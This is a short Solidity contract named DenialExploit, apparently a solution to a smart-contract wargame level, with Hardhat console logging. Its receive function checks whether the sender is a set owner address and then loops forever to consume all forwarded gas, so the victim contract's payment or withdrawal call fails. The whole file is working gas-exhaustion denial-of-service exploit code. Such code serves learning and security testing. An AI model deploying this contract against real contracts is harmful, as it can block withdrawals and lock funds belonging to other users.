// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract DenialExploit {

// call invokes the received function in exploit contract
// => check if the sender is the owner
// => revert (use all the gas)

	// set owner in constructor / setMethod
	address public owner;
	constructor(address _owner){
		owner = _owner;
	}

	function changeOwner(address _owner) external {
		owner = _owner;
	}

	receive() external payable {
		console.log(
			"receive from: ",
			msg.sender,
			" is owner: ",
			msg.sender == owner
		);

		if(msg.sender == owner){
			bytes32 c;
			while (true){
				// do something random
				c = keccak256("salem");
				c = keccak256("will make you revert");
			}
		}
	}

}